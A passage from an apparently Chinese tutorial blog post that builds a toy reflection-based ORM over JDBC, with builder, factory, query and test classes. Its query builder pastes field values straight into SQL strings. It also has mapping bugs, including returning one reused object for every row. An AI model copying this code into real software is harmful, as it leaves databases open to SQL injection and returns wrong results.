        <span class="token keyword">return</span> preparedStatement<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">//结果集</span>
    <span class="token keyword">private</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token function">resultSet</span><span class="token punctuation">(</span><span class="token class-name">ResultSet</span> resultSet <span class="token punctuation">,</span> <span class="token class-name">RowMapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> rowMapper<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>rowMapper<span class="token punctuation">.</span><span class="token function">mapRow</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> list<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">//关闭</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>connection <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>preparedStatement <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                preparedStatement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resultSet <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>resultSet<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>其中结果集的映射：RowMapper，这里写的接口，当使用的时候，使用匿名内部类操作</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">RowMapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">T</span> <span class="token function">mapRow</span><span class="token punctuation">(</span><span class="token class-name">ResultSet</span> resultSet<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>用户面向对象编程，不写SQL，所以我们底层需要反射获取对象的参数，然后解析拼接为SQL</p>
</blockquote>
<p>这里我们将反射对象的通用操作封装</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">BaseSQLBuilder</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token class-name">String</span> tableName<span class="token punctuation">;</span> <span class="token comment">//表名</span>
    <span class="token keyword">protected</span> <span class="token class-name">String</span> primaryKeyName<span class="token punctuation">;</span> <span class="token comment">//主键名</span>

    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">SELECT</span> <span class="token operator">=</span> <span class="token string">"select "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">FROM</span> <span class="token operator">=</span> <span class="token string">" from "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">WHERE</span> <span class="token operator">=</span> <span class="token string">" where "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">AND</span> <span class="token operator">=</span> <span class="token string">" and "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">IN</span> <span class="token operator">=</span> <span class="token string">" IN "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">UPDATE</span> <span class="token operator">=</span> <span class="token string">" UPDATE "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">SET</span> <span class="token operator">=</span> <span class="token string">" SET "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">VALUES</span> <span class="token operator">=</span> <span class="token string">" VALUES "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">OR</span> <span class="token operator">=</span> <span class="token string">" OR "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DELETE</span> <span class="token operator">=</span> <span class="token string">" DELETE "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">INSERT</span> <span class="token operator">=</span> <span class="token string">" INSERT "</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">INTO</span> <span class="token operator">=</span> <span class="token string">" INTO "</span><span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token class-name">StringBuilder</span> sqlBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">getTableName</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Table</span> table <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Table</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tableName <span class="token operator">=</span> table<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>tableName<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 全类名拆分</span>
            tableName <span class="token operator">=</span> <span class="token class-name">StringUtil</span><span class="token punctuation">.</span><span class="token function">getLastStr</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">getPrimaryKey</span><span class="token punctuation">(</span><span class="token class-name">Field</span> field<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">PrimaryKey</span> primaryKey <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">PrimaryKey</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryKeyName <span class="token operator">=</span> primaryKey<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>primaryKeyName<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            primaryKeyName <span class="token operator">=</span> <span class="token class-name">StringUtil</span><span class="token punctuation">.</span><span class="token function">getLastStr</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">hasPrimaryKey</span><span class="token punctuation">(</span><span class="token class-name">Field</span> field<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">PrimaryKey</span> primaryKey <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">PrimaryKey</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> primaryKey <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">protected</span> <span class="token class-name">String</span> <span class="token function">getField</span><span class="token punctuation">(</span><span class="token class-name">String</span> fieldStr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"get"</span> <span class="token operator">+</span> fieldStr<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> fieldStr<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">protected</span> <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getFields</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们只以查询为例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuerySQLBuilder</span> <span class="token keyword">extends</span> <span class="token class-name">BaseSQLBuilder</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">querySql</span><span class="token punctuation">(</span><span class="token class-name">Object</span> t<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 获取操作表名</span>
        <span class="token function">getTableName</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// SQL拼接</span>
        sqlBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token constant">SELECT</span> <span class="token operator">+</span> <span class="token string">"*"</span> <span class="token operator">+</span> <span class="token constant">FROM</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token constant">WHERE</span> <span class="token operator">+</span> <span class="token string">" 1=1 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> <span class="token function">getFields</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">String</span> fieldStr <span class="token operator">=</span> <span class="token class-name">StringUtil</span><span class="token punctuation">.</span><span class="token function">getLastStr</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> value <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token function">getField</span><span class="token punctuation">(</span>fieldStr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">null</span> <span class="token operator">!=</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                sqlBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token constant">AND</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>fieldStr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> sqlBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>我们将QuerySQLBuilder。。。其他Builder封装到一个工厂类中，进行获取</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SQLBuilderInstanceFactory</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token class-name">QuerySQLBuilder</span> queryBuilder <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token class-name">SaveSQLBuilder</span> saveBuilder <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token class-name">UpdateSQLBuilder</span> updateBuilder <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token class-name">DeleteSQLBuilder</span> deleteSQLBuilder <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">QuerySQLBuilder</span> <span class="token function">getQueryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>queryBuilder <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            queryBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QuerySQLBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> queryBuilder<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">SaveSQLBuilder</span> <span class="token function">getSaveBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>saveBuilder <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            saveBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SaveSQLBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> saveBuilder<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">UpdateSQLBuilder</span> <span class="token function">getUpdateBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>updateBuilder <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            updateBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpdateSQLBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> updateBuilder<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">DeleteSQLBuilder</span> <span class="token function">getDeleteSQLBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>deleteSQLBuilder <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            deleteSQLBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DeleteSQLBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> deleteSQLBuilder<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>定义查询接口</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IQuery</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">T</span> t<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>查询具体实现类</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token keyword">extends</span> <span class="token class-name">JdbcTemplate</span> <span class="token keyword">implements</span> <span class="token class-name">IQuery</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">T</span> t<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 解析出的SQL</span>
        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token class-name">SQLBuilderInstanceFactory</span><span class="token punctuation">.</span><span class="token function">getQueryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">querySql</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"sql  "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 执行SQL</span>
        <span class="token keyword">return</span> <span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">RowMapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">mapRow</span><span class="token punctuation">(</span><span class="token class-name">ResultSet</span> resultSet<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> fields<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token class-name">String</span> getField <span class="token operator">=</span> <span class="token class-name">StringUtil</span><span class="token punctuation">.</span><span class="token function">getSetMethod</span><span class="token punctuation">(</span><span class="token class-name">StringUtil</span><span class="token punctuation">.</span><span class="token function">getLastStr</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">Object</span> object <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token class-name">StringUtil</span><span class="token punctuation">.</span><span class="token function">getLastStr</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> field<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    t<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>getField<span class="token punctuation">,</span>field<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">return</span> t<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在大体上的代码都已经实现了，我们测试一下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user<span class="token punctuation">.</span><span class="token function">setAddress</span><span class="token punctuation">(</span><span class="token string">"china"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 查询操作</span>
        <span class="token class-name">Query</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> userQuery <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> userList <span class="token operator">=</span> userQuery<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到这期间用户在使用的过程中，没有写一句SQL，但可以正常操作数据库了。剩下的细节就等着我们去完善。</p>
